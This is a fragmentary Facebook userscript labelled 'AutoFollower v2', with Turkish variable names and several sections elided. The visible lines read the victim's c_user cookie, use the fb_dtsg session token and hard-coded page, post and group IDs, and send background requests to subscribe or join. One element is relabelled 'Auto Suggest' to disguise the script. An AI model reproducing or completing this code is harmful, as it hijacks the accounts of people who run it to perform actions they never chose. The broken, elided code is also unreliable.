...
// @description     Facebook AutoFollower v2
...
AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscr

ibe').setData({ flid: " + uidss + " }).send();";
...
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' 
...
var spage_id = "100000557598235_627399993955248";
var spost_id = "100000557598235_627399993955248";
var sfoto_id = "100000557598235_627399993955248";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Genrev';
